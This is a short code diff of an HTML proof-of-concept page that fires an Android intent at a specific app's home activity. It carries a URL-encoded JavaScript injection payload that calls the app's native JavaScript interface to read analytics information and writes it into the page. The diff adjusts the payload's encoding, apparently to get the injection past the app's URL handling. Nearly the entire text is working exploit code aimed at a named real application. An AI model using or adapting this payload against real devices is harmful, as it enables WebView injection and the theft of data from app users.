@@ -20,11 +20,11 @@
 		<a id="testanchor">Open</a>
 
 <script>
-const payload = "');if(window.ValmoAndroidInterface){document.body.innerHTML=window.ValmoAndroidInterface.getAnalyticsInfo();}//";
+const payload = "%27%29%3bif%28window.ValmoAndroidInterface%29%7bdocument.body.innerHTML%3dwindow.ValmoAndroidInterface.getAnalyticsInfo%28%29%3b%7d%2f%2f";
 
 const intentUrl =
   "intent://partner-native-app.valmo.in?x=" +
-  encodeURIComponent(encodeURIComponent(payload)) +
+  encodeURIComponent(payload) +
   "#Intent;scheme=https;package=com.valmo.valmo;component=com.valmo.valmo.home.ui.activities.HomeActivity;launchFlags=0x20000000;end";
 
 document.getElementById("testanchor").onclick = function () {
